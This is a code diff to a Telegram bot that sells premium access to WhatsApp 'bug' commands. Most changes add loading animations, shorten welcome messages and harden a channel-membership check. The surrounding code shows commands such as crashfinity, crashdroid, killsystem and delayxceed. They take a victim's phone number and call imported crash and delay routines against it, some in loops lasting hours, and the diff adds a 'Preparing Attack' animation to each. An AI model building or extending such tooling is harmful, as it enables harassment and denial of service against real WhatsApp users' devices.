@@ -264,29 +264,77 @@ function getAnimatedText(text, frameType = 'loading', index = 0) {
     return `${frames[index % frames.length]} ${text}`;
 }
 
+// ====== ANIMATION FUNCTIONS ======
+async function sendTypingAnimation(bot, chatId, duration = 3000) {
+    const frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
+    const msg = await bot.sendMessage(chatId, `${deco.bot} Loading...`);
+    const start = Date.now();
+    let i = 0;
+    
+    while (Date.now() - start < duration) {
+        await bot.editMessageText(`${frames[i % frames.length]} ${styleText('Loading System...', 'fancy')}`, {
+            chat_id: chatId,
+            message_id: msg.message_id
+        }).catch(() => {});
+        i++;
+        await new Promise(r => setTimeout(r, 300));
+    }
+    
+    await bot.deleteMessage(chatId, msg.message_id).catch(() => {});
+}
+
 async function sendWelcomeAnimation(bot, chatId, name) {
     const frames = [
-        `${deco.skull} Loading system...`,
-        `${deco.fire} Initializing modules...`,
-        `${deco.zap} Connecting to server...`,
-        `${deco.sparkles} Verifying user...`,
-        `${deco.crown} Welcome To The System!`
+        `${deco.skull} ${styleText('Initializing...', 'fancy')}`,
+        `${deco.fire} ${styleText('Loading Modules...', 'fancy')}`,
+        `${deco.zap} ${styleText('Connecting Server...', 'fancy')}`,
+        `${deco.sparkles} ${styleText('Verifying User...', 'fancy')}`,
+        `${deco.crown} ${styleText('Welcome!', 'script')}`
     ];
     
     let msg = await bot.sendMessage(chatId, `${deco.bot} Please wait...`);
     
     for (let i = 0; i < frames.length; i++) {
-        await new Promise(r => setTimeout(r, 600));
+        await new Promise(r => setTimeout(r, 700));
         await bot.editMessageText(frames[i], {
             chat_id: chatId,
             message_id: msg.message_id
         }).catch(() => {});
     }
     
-    await new Promise(r => setTimeout(r, 500));
+    await new Promise(r => setTimeout(r, 600));
     await bot.deleteMessage(chatId, msg.message_id).catch(() => {});
 }
 
+async function sendLoadingAnimation(bot, chatId, text = 'Processing') {
+    const frames = ['🔥', '💥', '⚡', '💫', '✨'];
+    let msg = await bot.sendMessage(chatId, `${frames[0]} ${text}...`);
+    
+    for (let i = 1; i < 6; i++) {
+        await new Promise(r => setTimeout(r, 400));
+        await bot.editMessageText(`${frames[i % frames.length]} ${text}...`, {
+            chat_id: chatId,
+            message_id: msg.message_id
+        }).catch(() => {});
+    }
+    
+    await bot.deleteMessage(chatId, msg.message_id).catch(() => {});
+}
+
+async function sendSuccessAnimation(bot, chatId, text) {
+    const msg = await bot.sendMessage(chatId, `${deco.success} ${text}`);
+    await new Promise(r => setTimeout(r, 2000));
+    await bot.deleteMessage(chatId, msg.message_id).catch(() => {});
+}
+
+async function sendErrorAnimation(bot, chatId, text) {
+    const msg = await bot.sendMessage(chatId, `${deco.error} ${text}`);
+    await new Promise(r => setTimeout(r, 2000));
+    await bot.deleteMessage(chatId, msg.message_id).catch(() => {});
+}
+// ====== END ANIMATIONS ======
+
+// ====== COMPACT WELCOME MESSAGE ======
 function getVerificationMessage(name) {
     const s = (text) => styleText(text, 'script');
     const f = (text) => styleText(text, 'fancy');
@@ -294,35 +342,40 @@ function getVerificationMessage(name) {
     
     return `
 ${deco.double}
-${deco.crystal} ${s('WELCOME TO THE SYSTEM')} ${deco.crystal}
+${deco.crystal} ${s('WELCOME')} ${deco.crystal}
 ${deco.double}
 
 ${deco.angel} Hey ${b(name)}!
 
-${deco.warning} ${f('VERIFICATION REQUIRED')} ${deco.warning}
+${deco.warning} ${f('JOIN TO USE BOT')}
 
-${deco.info} To use this bot, you must join our communities:
+${deco.bullet} Channel
+${deco.bullet} Group
 
-${deco.star} ${b('1. Telegram Channel')}
-${deco.arrow} ${config.channel}
-
-${deco.star} ${b('2. Telegram Group')}
-${deco.arrow} ${config.group}
-
-${deco.star} ${b('3. YouTube Channel')}
-${deco.arrow} ${config.youtube || 'https://youtube.com/@yourchannel'}
-
-${deco.star} ${b('4. WhatsApp Channel')}
-${deco.arrow} ${config.whatsapp || 'https://whatsapp.com/channel/yourchannel'}
-
-${deco.line}
-
-${deco.rocket} ${f('AFTER JOINING ALL:')}
-Click the button below to verify!
-
-${deco.line}
+${deco.rocket} Click below to join!
 `;
 }
+
+function getWelcomeAfterVerify(name) {
+    const s = (text) => styleText(text, 'script');
+    const b = (text) => styleText(text, 'bold');
+    
+    return `
+${deco.double}
+${deco.crown} ${s('VERIFIED')} ${deco.crown}
+${deco.double}
+
+${deco.angel} Welcome ${b(name)}!
+
+${deco.sparkles} You are verified!
+
+${deco.lock} Bug cmds need premium
+${deco.money} Contact admin to buy
+
+${deco.double}
+`;
+}
+// ====== END WELCOME ======
 
 async function notifyPremiumAdded(bot, userId, addedBy) {
     const s = (text) => styleText(text, 'script');
@@ -442,7 +495,6 @@ const saveDB = (data) => {
     }
 };
 
-// FIXED: Attitude premium message for free users
 function sendSYLove(bot, chatId) {
     const s = (text) => styleText(text, 'script');
     const f = (text) => styleText(text, 'fancy');
@@ -714,16 +766,33 @@ function startSYloveBot(token) {
             });
         }
 
-        // FIXED: Verification check function - checks if user actually joined channel and group
+        // ====== FIXED VERIFICATION CHECK ======
         async function checkUserJoined(userId) {
             try {
-                const channelMember = await S7.getChatMember(config.channel, userId);
-                const isChannelMember = channelMember && 
-                    (channelMember.status === 'member' || channelMember.status === 'administrator' || channelMember.status === 'creator');
+                let isChannelMember = false;
+                let isGroupMember = false;
                 
-                const groupMember = await S7.getChatMember(config.group, userId);
-                const isGroupMember = groupMember && 
-                    (groupMember.status === 'member' || groupMember.status === 'administrator' || groupMember.status === 'creator');
+                // Check channel membership
+                try {
+                    const channelMember = await S7.getChatMember(config.channel, userId);
+                    isChannelMember = channelMember && 
+                        (channelMember.status === 'member' || channelMember.status === 'administrator' || channelMember.status === 'creator');
+                } catch (channelErr) {
+                    log('error', 'VERIFY_CHECK_CHANNEL', channelErr.message);
+                    // If bot is not admin in channel, we can't check - assume joined for now
+                    // OR you can set isChannelMember = false to force admin setup
+                    isChannelMember = false;
+                }
+                
+                // Check group membership
+                try {
+                    const groupMember = await S7.getChatMember(config.group, userId);
+                    isGroupMember = groupMember && 
+                        (groupMember.status === 'member' || groupMember.status === 'administrator' || groupMember.status === 'creator');
+                } catch (groupErr) {
+                    log('error', 'VERIFY_CHECK_GROUP', groupErr.message);
+                    isGroupMember = false;
+                }
                 
                 return { channel: isChannelMember, group: isGroupMember };
             } catch (e) {
@@ -731,6 +800,7 @@ function startSYloveBot(token) {
                 return { channel: false, group: false };
             }
         }
+        // ====== END FIXED VERIFICATION ======
 
         SYLoVe('verify', async (msg) => {
             const chatId = msg.chat.id.toString();
@@ -741,13 +811,18 @@ function startSYloveBot(token) {
                 return S7.sendMessage(chatId, `${deco.success} ${styleText('You are already verified!', 'fancy')}`, { parse_mode: 'HTML' });
             }
             
+            // Show loading animation
+            await sendTypingAnimation(S7, chatId, 2000);
+            
             // FIXED: CHECK IF USER ACTUALLY JOINED CHANNEL AND GROUP
             const membership = await checkUserJoined(userId);
             
             if (!membership.channel || !membership.group) {
                 let missing = [];
-                if (!membership.channel) missing.push('Telegram Channel');
-                if (!membership.group) missing.push('Telegram Group');
+                if (!membership.channel) missing.push('Channel');
+                if (!membership.group) missing.push('Group');
+                
+                await sendErrorAnimation(S7, chatId, `Join ${missing.join(' & ')} first!`);
                 
                 return S7.sendMessage(chatId, 
                     `${deco.error} ${styleText('VERIFICATION FAILED', 'script')} ${deco.error}\n\n` +
@@ -760,27 +835,11 @@ function startSYloveBot(token) {
             
             verifyUser(userId);
             
+            // Welcome animation
             await sendWelcomeAnimation(S7, chatId, name);
             
-            const welcomeText = `
-${deco.double}
-${deco.crown} ${styleText('VERIFICATION SUCCESSFUL', 'script')} ${deco.crown}
-${deco.double}
-
-${deco.angel} Welcome ${styleText(name, 'bold')}!
-
-${deco.sparkles} You have successfully verified yourself.
-
-${deco.info} Now you can use the bot!
-
-${deco.line}
-
-${deco.lock} ${styleText('NOTE:', 'bold')}
-${deco.bullet} Bug commands require premium access
-${deco.bullet} Contact admin to buy premium
-
-${deco.double}
-`;
+            // Compact welcome text
+            const welcomeText = getWelcomeAfterVerify(name);
             
             const menuButtons = {
                 reply_markup: {
@@ -807,14 +866,15 @@ ${deco.double}
             const userId = msg.from.id.toString();
 
             if (!isUserVerified(userId)) {
+                // Show loading animation on start
+                await sendTypingAnimation(S7, chatId, 1500);
+                
                 const verifyText = getVerificationMessage(name);
                 const verifyButtons = {
                     reply_markup: {
                         inline_keyboard: [
                             [{ text: `${deco.rocket} Join Channel`, url: `${config.channel}` }],
                             [{ text: `${deco.ghost} Join Group`, url: `${config.group}` }],
-                            [{ text: `${deco.fire} YouTube`, url: `${config.youtube || 'https://youtube.com/@yourchannel'}` }],
-                            [{ text: `${deco.zap} WhatsApp`, url: `${config.whatsapp || 'https://whatsapp.com/channel/yourchannel'}` }],
                             [{ text: `${deco.verified} I have joined all`, callback_data: 'verify_me' }]
                         ]
                     }
@@ -875,13 +935,16 @@ ${deco.double}
                     return;
                 }
                 
+                // Loading animation
+                await sendTypingAnimation(S7, chatId, 1500);
+                
                 // FIXED: CHECK IF USER ACTUALLY JOINED BEFORE VERIFYING
                 const membership = await checkUserJoined(userId);
                 
                 if (!membership.channel || !membership.group) {
                     let missing = [];
-                    if (!membership.channel) missing.push('Telegram Channel');
-                    if (!membership.group) missing.push('Telegram Group');
+                    if (!membership.channel) missing.push('Channel');
+                    if (!membership.group) missing.push('Group');
                     
                     await S7.answerCallbackQuery(query.id, { 
                         text: `Join first! Missing: ${missing.join(', ')}`, 
@@ -892,6 +955,9 @@ ${deco.double}
                 
                 verifyUser(userId);
                 await S7.answerCallbackQuery(query.id, { text: 'Verification successful!', show_alert: true });
+                
+                // Welcome animation
+                await sendWelcomeAnimation(S7, chatId, name);
                 
                 const captionText = MainSYLoVe(name, uptime, userId) + `
 ┌──────┤ ${styleText('Press Button Menu', 'fancy')} ├──────┐
@@ -1096,7 +1162,6 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
             return executeFn();
         }
 
-        // FIXED: /groupid command - strips query params from WhatsApp link
         SYLoVe('groupid', async (msg) => {
             const chatId = msg.chat.id.toString();
             const userId = msg.from.id.toString();
@@ -1118,7 +1183,6 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
             }
 
             try {
-                // FIX: Strip query parameters from link
                 let cleanLink = link.split('?')[0];
                 const code = cleanLink.split('chat.whatsapp.com/')[1].trim();
                 
@@ -1161,6 +1225,10 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (!exists) return S7.sendMessage(chatId, `This Number isn't on WhatsApp`);
 
                     log('command', msg.from.first_name, `Calling xbetainvis on ${cleanTarget}`);
+                    
+                    // Loading animation
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
 
                     await xbetainvisLogic.xbetainvis(client, targetJid);
@@ -1194,6 +1262,10 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (!exists) return S7.sendMessage(chatId, `This Number isn't on WhatsApp`);
 
                     log('command', msg.from.first_name, `Calling ${cmd} on ${cleanTarget}`);
+                    
+                    // Loading animation
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
 
                     const delayFn = ms => new Promise(res => setTimeout(res, ms));
@@ -1243,6 +1315,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (!exists) return S7.sendMessage(chatId, `This Number isn't on WhatsApp`);
 
                     log('command', msg.from.first_name, `Calling xdelayinvis on ${cleanTarget}`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
 
                     const delayFn = ms => new Promise(res => setTimeout(res, ms));
@@ -1291,6 +1366,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (!exists) return S7.sendMessage(chatId, `This Number isn't on WhatsApp`);
 
                     log('command', msg.from.first_name, `Calling crashfinity on ${cleanTarget}`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
 
                     if (typeof CrashLogic.crashfinity === 'function') {
@@ -1325,6 +1403,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (!exists) return S7.sendMessage(chatId, `This Number isn't on WhatsApp`);
 
                     log('command', msg.from.first_name, `Calling crashdroid on ${cleanTarget}`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
 
                     const delayFn = ms => new Promise(res => setTimeout(res, ms));
@@ -1373,6 +1454,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (!exists) return S7.sendMessage(chatId, `This Number isn't on WhatsApp`);
 
                     log('command', msg.from.first_name, `Calling killsystem on ${cleanTarget}`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
 
                     await killsystemLogic.killsystem(client, targetJid);
@@ -1405,6 +1489,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (!exists) return S7.sendMessage(chatId, `This Number isn't on WhatsApp`);
 
                     log('command', msg.from.first_name, `Calling delayxceed on ${cleanTarget}`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
 
                     const delayFn = ms => new Promise(res => setTimeout(res, ms));
@@ -1453,6 +1540,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (!exists) return S7.sendMessage(chatId, `This Number isn't on WhatsApp`);
 
                     log('command', msg.from.first_name, `Calling nullfinity on ${cleanTarget}`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
 
                     await XLogic.Xdelay(client, targetJid);
@@ -1487,6 +1577,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (!exists) return S7.sendMessage(chatId, `This Number isn't on WhatsApp`);
 
                     log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget}`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
 
                     const delayMs = 2000;
@@ -1544,6 +1637,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     const targetJid = targetNum.trim();
 
                     log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours}h`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });
 
                     const delayMs = 2000;
@@ -1589,6 +1685,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     const targetJid = targetNum.trim();
 
                     log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours}h`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });
 
                     const delayMs = 2000;
@@ -1630,6 +1729,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (!exists) return S7.sendMessage(chatId, `This Number isn't on WhatsApp`);
 
                     log('command', msg.from.first_name, `Calling ${cmd} on ${cleanTarget}`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
 
                     const delayFn = ms => new Promise(res => setTimeout(res, ms));
@@ -1679,6 +1781,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (!exists) return S7.sendMessage(chatId, `This Number isn't on WhatsApp`);
 
                     log('command', msg.from.first_name, `Calling hidenseek on ${cleanTarget}`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
 
                     const delayFn = ms => new Promise(res => setTimeout(res, ms));
@@ -1730,6 +1835,9 @@ ${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}`
                     if (isNaN(hours) || hours <= 0) return S7.sendMessage(chatId, 'Invalid duration');
 
                     log('command', msg.from.first_name, `Calling ${cmd} on ${targetJid} for ${hours}h`);
+                    
+                    await sendLoadingAnimation(S7, chatId, 'Preparing Attack');
+                    
                     await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });
 
                     const delayFn = ms => new Promise(res => setTimeout(res, ms));
